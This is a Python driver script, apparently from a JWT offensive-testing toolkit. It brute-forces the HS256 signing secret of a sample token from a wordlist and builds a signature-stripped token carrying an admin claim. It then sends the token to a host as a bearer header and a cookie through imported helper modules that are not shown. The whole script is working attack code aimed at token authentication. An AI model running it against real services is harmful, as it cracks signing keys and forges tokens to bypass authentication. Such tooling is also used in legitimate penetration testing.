## jwt hacking main, tests all JWT hacking activities

from jwtAlgos.bruteForceHS import hs_brute_force
from jwtHelper.jwtSplitter import jwt_reader
from jwtHelper.sendRequest import send_request
import os
from dotenv import load_dotenv
import requests


load_dotenv()
brute_force_wordlist = os.getenv("BRUTE-FORCE-LIST-PATH")

with open(brute_force_wordlist, "r", encoding="utf-8") as f:
    wordlist = [line.strip() for line in f if line.strip()]



jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.bSlEuvn0YR1UOsIamGu8dTgfB3bz3_585Q3b_DxwyeM"

alg = jwt_reader.get_jwt_alg(jwt)
testrun = hs_brute_force.brute_force_secret(jwt, wordlist)
print(testrun)


host = "example.com"

headers = {
    "Host": f"{host}",
    "Authorization": f"Bearer {jwt}"
}

cookies = {
    "EXAMPLE_AUTH_COOKIE": f"{jwt}"
}


new_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0."


respcode = send_request.send_get_request(host, jwt, headers, cookies)

print(respcode)